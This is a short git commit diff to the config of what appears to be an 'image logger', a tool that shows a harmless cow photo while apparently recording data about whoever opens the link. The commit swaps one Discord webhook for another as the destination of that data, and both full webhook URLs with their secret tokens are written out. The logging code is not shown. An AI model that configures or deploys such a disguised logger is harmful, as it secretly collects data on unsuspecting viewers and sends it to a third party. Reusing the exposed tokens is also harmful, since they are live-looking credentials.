59b2103a354e5fe0c49511b7203bdf78b590ed13
lolbro1125 <zyadomar.6763@gmail.com>
2025-03-22 17:40:18 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1352957283084140564/X7zv0jKbTL4jOWuTnyGH_b-XA7sXcl89ypVGFe_PJyKaa9uS5dSORcrMXwV5LGQI7gll",
+    "webhook": "https://discord.com/api/webhooks/1353030368780877879/nBtzorR5FqdcbwwZ-0hGIa3w6nGYVApPhSmDiQYXhdX-MkVSZBIxmaSj_FNanB-k7eb9",
     "image": "https://cyfairanimalhospital.com/wp-content/uploads/2019/07/Cows1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
